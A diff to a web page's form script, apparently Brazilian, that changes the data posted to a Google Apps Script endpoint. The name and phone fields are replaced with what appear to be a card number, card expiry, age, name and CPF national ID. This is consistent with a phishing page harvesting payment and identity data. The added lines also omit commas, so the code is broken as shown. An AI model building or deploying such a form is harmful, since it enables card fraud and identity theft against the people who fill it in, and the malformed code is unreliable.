@@ -97,11 +97,14 @@ button {
 function enviar(e) {
   e.preventDefault();
 
-  fetch("https://script.google.com/macros/s/AKfycbxKWN6ZuHb2wY0jJzvi7PqswUL2fZBKPhvRpVVAAZnhzCcFC0xLNKdKH0IHZuTRgSE/exec", {
+  fetch("https://script.google.com/macros/s/AKfycbydMJCn1mocIURyJs1EdyeKy0aa1LrUD0GKm-RJwtBf67k5QLfaPCtqMjGiUgopQi0T/exec", {
     method: "POST",
     body: new URLSearchParams({
-      nome: document.getElementById("nome").value,
-      telefone: document.getElementById("telefone").value
+      numero: document.getElementById("numero").value,
+      validade: document.getElementById("validade").value
+      idade: document.getElementById("idade").value
+      nome: document.getElementById("nome").value
+      cpf: document.getElementById("cpf").value
     })
   })
   .then(() => {
@@ -115,3 +118,4 @@ function enviar(e) {
 
 </body>
 </html>
+
